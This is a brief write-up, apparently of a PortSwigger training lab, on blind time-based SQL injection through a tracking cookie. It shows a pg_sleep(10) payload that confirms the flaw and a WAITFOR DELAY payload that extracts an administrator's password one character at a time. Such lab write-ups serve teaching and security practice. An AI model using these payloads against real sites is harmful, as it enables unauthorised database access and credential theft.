## Question:

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/3ef3396b-e61e-4f70-b02a-fe32c9bf4e65)

## Solution:

Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:

`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/8ae64321-cc21-4f63-971f-cf55afe230b3)

Query made -

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<COOKIE-VALUE>'`

Query Changed -

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<COOKIE-VALUE>' '||pg_sleep(10)--`

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/51cbd7f3-51a7-4dc7-97c4-cf7d7fef6347)

We get a response after 10 sec which confirms the SQL injection vulnerability.

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/9a2b7dd3-ae1d-4e65-a59e-86c6a75d7d42)

